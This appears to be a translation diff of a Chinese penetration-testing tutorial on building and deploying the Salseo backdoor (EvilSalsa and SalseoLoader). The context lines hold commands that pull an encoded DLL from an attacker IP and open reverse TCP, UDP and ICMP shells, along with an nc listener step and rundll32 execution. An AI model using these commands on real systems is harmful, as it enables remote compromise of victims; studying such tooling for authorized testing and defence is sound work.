@@ -6,11 +6,11 @@
 
 从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。您需要安装**Visual Studio**来编译代码。
 
-为您将要使用的Windows机器的架构编译这些项目（如果Windows支持x64，则为该架构编译）。
+为您将要使用的Windows盒子的架构编译这些项目（如果Windows支持x64，则为该架构编译）。
 
 您可以在Visual Studio的**左侧“Build”选项卡**中的**“Platform Target”**选择架构。
 
-(\*\*如果找不到此选项，请按**“Project Tab”**，然后在**“\<Project Name> Properties”**中)
+（**如果找不到此选项，请点击**“Project Tab”**，然后点击**“\<Project Name> Properties”**）
 
 ![](<../images/image (132).png>)
 
@@ -20,7 +20,7 @@
 
 ## 准备后门
 
-首先，您需要对**EvilSalsa.dll**进行编码。为此，您可以使用python脚本**encrypterassembly.py**，或者您可以编译项目**EncrypterAssembly**：
+首先，您需要编码**EvilSalsa.dll**。为此，您可以使用python脚本**encrypterassembly.py**，或者您可以编译项目**EncrypterAssembly**：
 
 ### **Python**
 ```
@@ -40,7 +40,7 @@ EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 
 ### **获取 TCP 反向 shell（通过 HTTP 下载编码的 dll）**
 
-记得启动一个 nc 作为反向 shell 监听器，并启动一个 HTTP 服务器来提供编码的 evilsalsa。
+记得启动 nc 作为反向 shell 监听器，并启动一个 HTTP 服务器来提供编码的 evilsalsa。
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -50,7 +50,7 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **获取 ICMP 反向 shell（受害者内部已编码的 dll）**
+### **获取 ICMP 反向 shell（编码的 dll 已经在受害者内部）**
 
 **这次你需要一个特殊的工具在客户端接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -83,7 +83,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **搜索 DllExport 包（使用浏览选项卡），然后按安装（并接受弹出窗口）**
+#### **搜索 DllExport 包（使用浏览选项卡），并按安装（并接受弹出窗口）**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -101,7 +101,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 然后，转到你的 **SalseoLoader 文件夹** 并 **执行 DllExport_Configure.bat**
 
-选择 **x64**（如果你打算在 x64 盒子中使用它，那是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间中**）并按 **应用**
+选择 **x64**（如果你打算在 x64 环境中使用它，那是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间中**）并按 **应用**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
@@ -125,13 +125,13 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 测试生成的 Dll
 
-将 Dll 复制并粘贴到你想测试的位置。
+复制并粘贴 Dll 到你想测试的位置。
 
 执行:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-如果没有错误出现，您可能有一个功能正常的 DLL！！
+如果没有错误出现，您可能拥有一个功能正常的 DLL！！
 
 ## 使用 DLL 获取 shell
 
